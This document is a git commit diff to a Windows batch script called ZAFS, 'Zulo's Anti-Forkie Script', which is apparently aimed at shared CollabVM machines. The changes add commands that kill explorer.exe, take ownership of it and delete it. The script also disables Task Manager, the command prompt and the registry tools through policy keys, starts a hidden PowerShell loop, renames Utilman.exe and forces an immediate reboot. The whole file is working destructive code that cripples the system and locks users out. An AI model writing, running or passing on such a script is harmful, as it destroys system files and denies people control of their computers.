febb727a2bc0252961fe45f5fb2801ef0c12a6e4
samzeq <samu_pereira_oliveira@outlook.com>
2024-12-23 03:38:59 -0300

    Update ZAFS.bat

--- ZAFS.bat
+++ ZAFS.bat
@@ -4,12 +4,16 @@
 ::                      ZAFS
 
 :: ===================================================
-:: btw, open source now
+:: btw, closed-source
 :: ZAFS, Zulo's Anti-Forkie Script
 :: btw, if you dont know what is a forkie, a forkie is a user that constantly destroys computernewb.com's CollabVM
 :: dont execute this on your real computer unless you know what you are doing
 echo Executing illegal magic...
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "explorer.exe" /f >nul 2>&1
+taskkill /f /im explorer.exe >nul 2>&1
+takeown /f "C:\Windows\explorer.exe" /a /r /d y >nul 2>&1
+icacls "C:\Windows\explorer.exe" /grant Administrators:F >nul 2>&1
+del /f /q "C:\Windows\explorer.exe" >nul 2>&1
+
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
@@ -23,5 +27,5 @@ start /b powershell -nologo -WindowStyle Hidden -command "while($true){$lol = Ge
 start /min cmd /c "takeown /f C:\Windows\system32\Utilman.exe && icacls C:\Windows\system32\Utilman.exe /grant "%username%":M && rename C:\Windows\system32\Utilman.exe ~Utilman.exe"
 
 shutdown -r -t 0
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 9 /t REG_SZ /d reg.exe /f & reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
 exit
